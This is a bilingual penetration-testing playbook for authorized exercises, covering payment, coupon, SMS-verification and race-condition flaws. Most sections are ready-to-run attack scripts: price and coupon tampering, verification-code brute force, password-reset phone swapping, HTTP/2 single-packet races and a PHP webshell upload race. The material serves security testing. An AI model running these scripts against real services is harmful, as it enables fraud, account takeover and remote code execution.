# 业务逻辑 / 竞态（支付 / 券 / 库存 / 并发）
> 护网使用：授权、ROE、留痕、报告见 `../hw-rules/`。

---


> 写不写只认 `../hw-rules/report-format.md`。进站有会话时最低探针见 `../hw-rules/workflow.md` §4.2.3（加字段、跳步、领取/库存/券并发一枪）。本篇是测法：支付/流程/验证码都测；发码/滑块没进号就转认证链，别停半截。
> 手法索引「商家促销绑定」在 §1.4。英文 business-logic / CHECKLIST / METHODOLOGY / SCENARIOS 附件已砍；支付/流程/验证码测法仍在上半。

---


## 逻辑漏洞测试手册

## 一、支付逻辑漏洞

### 1.1 价格篡改

```bash
# 在购物车提交时，修改商品单价
# 抓取订单提交请求，修改 price 字段
POST /api/order/create
{"goodsId": "123", "count": 1, "price": "0.01"}  # 原价改为 0.01

# 负数价格（余额增加）
{"goodsId": "123", "count": 1, "price": "-100"}
```

### 1.2 数量篡改

```bash
# 购买 1 件但请求中修改为 -1（可能退款）
{"goodsId": "123", "count": -1, "price": "99.00"}

# 整数溢出（32位最大值）
{"count": 2147483647}
```

### 1.3 优惠券/积分漏洞

```bash
# 重复使用同一优惠券
# 并发竞争（多线程同时提交同一优惠券）
for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/coupon/use" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"couponId": "COUPON123"}' &
done
wait

# 负数积分（积分兑换时设负数）
{"points": -1000}  # 期望余额增加
```

### 1.4 商家促销绑定：券挂到别人的货（手法索引有指针）

> 本质：商家后台「把我的促销/券绑到某件货」只信请求里的 `productId`，不查这件货是不是本店的。  
> 和结账改价、改券面值、结账换便宜 SKU **不是一条**。手法索引一行指向本节。

**认：** 有商家/供应商后台；能建满减、无门槛券、促销；绑货接口名常带 `relate` / `bind` / `attach` / `apply` + `promo` / `salespromotion` / `coupon`；body 里同时有券/活动 ID 和 `productId` / `skuId` / `goodsId`。

**打：**

1. 用本店号建一张规则狠的券（无门槛、面值够大、不限本店品类更好）  
2. 正常绑一次自己的货，抓住绑定请求  
3. **只改** `productId`（或同义字段）成别人店、别的品类的货；券 ID / 活动 ID 不动  
4. 不登录打开 C 端那件货的详情/下单页，看标价和应付  

**算成：** C 端别人那件货的应付价按你这张券掉下来（能下单更好）。只证明绑定接口 200、商家后台列表多了一行 → 不算，必须 C 端价真变。

**假点：** 绑定成功但 C 端价/结算不变；后端按商家会话重写商品、只绑得动自己的货；改的是 C 端结账包里的 `productId` 换成更便宜的 SKU（那是清单里已有的「结账换货」，不是本条）。

和邻近手法别混：

| 本条 | 别当成 |
|------|--------|
| B 端绑券接口，改的是「绑到哪件货」 | C 端结账改 `amount` / `coupon_amount` |
| 自己的券 + 别人的 `productId` | 结账把 `productId` 换成更便宜的 SKU 再付钱 |
| 要看到 C 端价掉下来 | 商家后台列表显示绑成功就算 |

开场半分钟：有商家后台就建券 → 抓绑定包 → 换一个明显不是本店的 `productId` → 打开 C 端看价。

---

## 二、验证码/短信漏洞

> 测到接管/越权闭环（码回显+登录、万能码+登录、爆破+改密）才算打穿。只触发发送/滑块过了/能试密没进号 → 转认证链，别停半截。

### 2.1 验证码可枚举

```python
import requests

# 4位数字验证码 - 逐一尝试
for code in range(0, 10000):
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": f"{code:04d}"})
    if r.json().get("code") == 0:
        print(f"正确验证码: {code:04d}")
        break

# 验证: 是否有频率限制（前20次无限制 → 没进号继续跟认证链）
```

### 2.2 万能验证码

```
测试以下验证码:
000000, 123456, 888888, 666666
111111, 999999
空值: ""
不发验证码直接提交
```

### 2.3 短信轰炸（内部略测限频，别停半截）

> 只证明能发码不算打穿。下面技术点防把轰炸接口当主洞。

```python
# 测试是否有发送频率限制（仅测试1-2次，不实际轰炸）
# 验证:
# 1. 同号码连续发送间隔是否有限制
# 2. IP 限制是否存在
# 3. 修改 phone 参数但仍发送到固定号码
{"phone": "目标手机号", "realPhone": "13800138000"}
```

---

## 三、竞争条件（Race Condition）

### 3.1 并发扣减

```python
import threading
import requests

# 余额 100，同时发起 10 次 100 元消费
def consume():
    r = requests.post("https://target.com/api/pay",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": 100})
    print(r.json())

threads = [threading.Thread(target=consume) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.2 重复提交

```bash
# 订单重复提交（同一请求发多次）
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/order/pay" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"orderId": "ORDER123", "amount": "0.01"}' &
done
```

---

## 四、账号安全漏洞

### 4.1 账号枚举

```bash
# 注册/登录接口区分"用户不存在"和"密码错误"
# 如果响应不同 → 可枚举账号

# 注册时检测手机号是否已注册
curl "https://target.com/api/register/check?phone=13800138000"
# 响应 {"exists": true} → 可枚举
```

### 4.2 密码找回逻辑

```
测试流程:
1. 发起找回密码（手机 A）
2. 获取到 token/链接
3. 修改请求中的 phone 为手机 B
4. 如果成功修改 B 的密码 → 任意账号密码重置
```

### 4.3 接管漏洞

```
场景: 手机注销后重新分配给他人
1. 用已注销号码注册
2. 尝试登录原绑定账号
3. 或: 修改绑定手机号时验证码发送到旧号
```

---

## 五、业务逻辑绕过

### 5.1 状态机绕过

```bash
# 正常流程: 步骤1 → 步骤2 → 步骤3 → 完成
# 尝试跳过步骤2直接执行步骤3
# 或者回退到步骤1但保留步骤3的结果

# 记录每步的请求，逐一重放，观察能否越过校验
```

### 5.2 测试用参数

```
在请求中添加：
debug=true / test=1 / internal=1
is_admin=true / role=admin
from_internal=1 / bypass_check=1
```

---


---

> 结构：上半原有是主线（支付/券/库存）；下半补充加深（HTTP/2 单包、Turbo Intruder）。支付/券竞态先看原有，单包手法再开补充。
>
> 与 `../hw-rules/workflow.md-hunting` 冲突时以 rules 为准。验证码并发只为打通登录/改密才报；纯短信轰炸不写。


## 竞态条件测试手册

## 一、竞态条件原理

### TOCTOU (Time-of-Check to Time-of-Use)

```
正常流程:
1. 检查条件（如余额是否充足）
2. 执行操作（扣款）

竞态条件:
线程A: 检查余额100 → 扣款50
线程B: 检查余额100 → 扣款50
结果: 余额应为0，实际可能为50或-50
```

对象存储配了「不存在则回源」、检测和真正下载拆开时：对同一 key 边 PUT 边 DELETE，可绕过「先看对象在不在」。见 `ssrf.md`「COS 回源竞态」。**见了回源再打**，不是每站必打。

---

## 二、高危场景识别

### 2.1 优惠券/红包领取

```python
# 一次性资源重复获取
# 场景: 优惠券限领1次，但并发请求可领多次

import requests
import threading

url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

def claim():
    r = requests.post(url, headers=headers, json=data)
    print(r.json())

# 并发50次
threads = [threading.Thread(target=claim) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查账户是否领到多张优惠券
```

### 2.2 余额/积分消费（双花攻击）

```python
# 场景: 余额100，同时发起2笔100的消费

import asyncio
import aiohttp

async def consume(session):
    async with session.post(
        "https://target.com/api/pay",
        headers={"Authorization": "Bearer TOKEN"},
        json={"amount": 100}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [consume(session) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())

# 检查: 是否成功消费超过余额的金额
```

### 2.3 投票/点赞（重复计数）

```bash
# 场景: 每人限投1票，但并发可投多票

for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/vote" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"targetId": "123"}' &
done
wait

# 检查目标的票数是否增加超过1
```

### 2.4 文件上传后删除

```python
# 场景: 上传 webshell → 系统检测到恶意 → 删除
# 利用: 上传后立即并发访问，在删除前执行

import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    requests.post("https://target.com/upload", files=files)

def access():
    for _ in range(100):
        r = requests.get("https://target.com/uploads/shell.php?c=id")
        if r.status_code == 200:
            print("成功执行:", r.text)
            break

# 线程1上传，线程2疯狂访问
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

### 2.5 限量抢购（库存超卖）

```python
# 场景: 商品库存10，但100人同时下单

import requests
import threading

def buy():
    r = requests.post("https://target.com/api/order/create",
        headers={"Authorization": "Bearer TOKEN"},
        json={"goodsId": "LIMITED_ITEM", "count": 1})
    print(r.json())

threads = [threading.Thread(target=buy) for _ in range(100)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查: 是否有超过10个订单成功
```

### 2.6 验证码验证

```python
# 场景: 验证码验证后失效，但并发提交可绕过

import requests
import threading

code = "123456"  # 获取到的验证码

def submit():
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": code})
    print(r.json())

# 并发提交同一验证码
threads = [threading.Thread(target=submit) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---

## 三、测试工具与方法

### 3.1 HTTP/2 单包攻击（Single Packet Attack）

**原理**: HTTP/2 多路复用允许在一个 TCP 包内发送多个请求，消除网络抖动，所有请求几乎同时到达服务器。

#### h2load 用法

```bash
# 安装 h2load (nghttp2)
# Ubuntu: apt install nghttp2-client
# macOS: brew install nghttp2

# 发送50个并发请求，使用1个连接，每个连接最多50个流
h2load -n 50 -c 1 -m 50 \
  -H "Authorization: Bearer TOKEN" \
  -d '{"couponId":"NEWUSER100"}' \
  -H "Content-Type: application/json" \
  https://target.com/api/coupon/claim

# 参数说明:
# -n: 总请求数
# -c: 并发连接数（设为1确保单包）
# -m: 每个连接的最大并发流数
# -d: POST 数据
# -H: 请求头
```

#### Python httpx 实现

```python
import httpx
import asyncio

async def single_packet_attack():
    """HTTP/2 单包攻击"""
    url = "https://target.com/api/coupon/claim"
    headers = {
        "Authorization": "Bearer TOKEN",
        "Content-Type": "application/json"
    }
    data = {"couponId": "NEWUSER100"}
    
    # 使用 HTTP/2
    async with httpx.AsyncClient(http2=True) as client:
        # 在同一连接上并发发送请求
        tasks = [
            client.post(url, headers=headers, json=data)
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)
        
        for i, resp in enumerate(responses):
            print(f"请求 {i+1}: {resp.status_code} - {resp.text}")

asyncio.run(single_packet_attack())
```

### 3.2 Turbo Intruder（Burp 插件）

```python
# Burp → Extender → BApp Store → Turbo Intruder

# 脚本示例（在 Turbo Intruder 中使用）
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=50,
                          pipeline=False)
    
    for i in range(50):
        engine.queue(target.req)
    
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 Python asyncio + aiohttp

```python
import asyncio
import aiohttp
import time

async def race_condition_test(url, headers, data, count=50):
    """通用竞态条件测试"""
    
    async def send_request(session, index):
        start = time.time()
        async with session.post(url, headers=headers, json=data) as resp:
            elapsed = time.time() - start
            result = await resp.json()
            return {
                "index": index,
                "status": resp.status,
                "elapsed": elapsed,
                "result": result
            }
    
    # 创建连接池，复用连接
    connector = aiohttp.TCPConnector(limit=1, limit_per_host=1)
    async with aiohttp.ClientSession(connector=connector) as session:
        # 预热连接
        await session.post(url, headers=headers, json=data)
        
        # 并发发送
        tasks = [send_request(session, i) for i in range(count)]
        results = await asyncio.gather(*tasks)
        
        return results

# 使用示例
url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

results = asyncio.run(race_condition_test(url, headers, data, 50))

# 分析结果
success_count = sum(1 for r in results if r['status'] == 200)
print(f"成功请求数: {success_count}/50")

# 检查响应时间分布（越接近说明并发度越高）
times = [r['elapsed'] for r in results]
print(f"最快: {min(times):.3f}s, 最慢: {max(times):.3f}s, 平均: {sum(times)/len(times):.3f}s")
```

### 3.4 curl 并发

```bash
# 简单并发（网络抖动较大，效果较差）
for i in $(seq 1 50); do
  curl -X POST "https://target.com/api/coupon/claim" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"couponId":"NEWUSER100"}' &
done
wait

# 使用 GNU Parallel（更好的并发控制）
seq 1 50 | parallel -j 50 \
  'curl -X POST "https://target.com/api/coupon/claim" \
   -H "Authorization: Bearer TOKEN" \
   -H "Content-Type: application/json" \
   -d "{\"couponId\":\"NEWUSER100\"}"'
```

---

## 四、判断标准

### 如何确认竞态条件成功

#### 4.1 余额/积分变化

```python
# 测试前记录余额
before = get_balance()

# 执行竞态测试
race_condition_test(...)

# 测试后检查余额
after = get_balance()

# 判断
if before - after > expected_deduction:
    print("竞态条件成功: 扣款异常")
```

#### 4.2 重复记录

```sql
-- 检查数据库是否有重复记录
SELECT coupon_id, user_id, COUNT(*) as count
FROM user_coupons
WHERE user_id = 'TEST_USER'
GROUP BY coupon_id, user_id
HAVING count > 1;
```

#### 4.3 库存异常

```python
# 检查订单数是否超过库存
orders = get_orders(goods_id="LIMITED_ITEM")
stock = get_stock(goods_id="LIMITED_ITEM")

if len(orders) > stock:
    print(f"库存超卖: 库存{stock}，订单{len(orders)}")
```

#### 4.4 响应内容分析

```python
# 分析所有响应
results = race_condition_test(...)

success_responses = [r for r in results if r['status'] == 200]
print(f"成功响应数: {len(success_responses)}")

# 检查响应中的业务状态码
business_success = [r for r in success_responses 
                   if r['result'].get('code') == 0]
print(f"业务成功数: {len(business_success)}")

# 如果业务成功数 > 1（对于一次性资源）→ 竞态条件存在
```

---

## 五、WooYun 实战模式

### 5.1 支付场景

```python
# 案例: 余额100，同时发起2笔100的支付
# 期望: 第二笔失败
# 实际: 两笔都成功，余额变为-100

async def double_spend_attack():
    url = "https://target.com/api/pay"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {"orderId": "ORDER123", "amount": 100}
    
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, headers=headers, json=data),
            session.post(url, headers=headers, json=data)
        ]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

### 5.2 优惠券场景

```python
# 案例: 同一优惠券并发使用多次
# 期望: 只能使用1次
# 实际: 使用了10次

async def coupon_reuse_attack():
    url = "https://target.com/api/order/create"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {
        "goodsId": "ITEM123",
        "couponId": "DISCOUNT50"  # 50元优惠券
    }
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers, json=data) 
                for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        success = sum(1 for r in results if r.status == 200)
        print(f"成功使用优惠券 {success} 次")
```

### 5.3 签到/积分场景

```python
# 案例: 并发签到获得多倍积分
# 期望: 每日签到1次，获得10积分
# 实际: 并发签到20次，获得200积分

async def checkin_race():
    url = "https://target.com/api/checkin"
    headers = {"Authorization": "Bearer TOKEN"}
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

---

## 六、高级技巧

### 6.1 延迟释放（Delay Release）

```python
# 在检查和执行之间插入延迟，增加竞态窗口

# 服务端伪代码:
# balance = get_balance(user_id)
# if balance >= amount:
#     time.sleep(0.1)  # 人为延迟
#     deduct_balance(user_id, amount)

# 攻击: 在这0.1秒内发送多个请求
```

### 6.2 连接复用

```python
# 复用 TCP 连接，减少握手时间，提高并发度

import requests
from requests.adapters import HTTPAdapter

session = requests.Session()
adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1)
session.mount('https://', adapter)

# 所有请求使用同一连接
for _ in range(50):
    session.post(url, headers=headers, json=data)
```

### 6.3 时间窗口探测

```python
# 先探测操作耗时，找到最佳攻击窗口

import time

def measure_timing():
    times = []
    for _ in range(10):
        start = time.time()
        requests.post(url, headers=headers, json=data)
        elapsed = time.time() - start
        times.append(elapsed)
    
    avg_time = sum(times) / len(times)
    print(f"平均响应时间: {avg_time:.3f}s")
    
    # 如果响应时间 > 100ms，竞态窗口较大
    return avg_time

# 根据响应时间调整并发数
avg_time = measure_timing()
if avg_time > 0.1:
    concurrent_count = 100  # 窗口大，增加并发
else:
    concurrent_count = 20   # 窗口小，减少并发
```

---

## 七、防护检测

```python
# 检测是否有竞态保护

# 1. 数据库锁（悲观锁）
# 特征: 并发请求时，后续请求等待前一个完成
# 检测: 观察响应时间是否呈阶梯状增长

# 2. 乐观锁（版本号）
# 特征: 并发请求时，只有一个成功，其他返回"版本冲突"
# 检测: 观察失败响应的错误信息

# 3. 分布式锁（Redis）
# 特征: 类似数据库锁
# 检测: 响应时间分析

# 4. 幂等性设计
# 特征: 重复请求返回相同结果，不产生副作用
# 检测: 多次发送相同请求，观察结果是否一致
```

---

## 九、注意事项

1. **测试范围**: 只在自己的测试账号上测试，不要影响其他用户
2. **测试强度**: 并发数不要过大（建议 ≤ 50），避免 DoS
3. **数据恢复**: 测试后检查账户状态，如有异常及时报告
4. **PoC 证据**: 保存测试前后的余额/积分截图，以及所有请求响应

---

## 竞态补充

### race-condition

### Race Conditions — Testing & Exploitation Playbook


## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Multiplex several complete HTTP/2 streams and **coalesce** their frames so the first bytes of all requests exit the NIC in **one** TCP segment (or minimally separated). Receiver-side scheduling then processes them with **sub-millisecond** spacing.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `logic-race.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

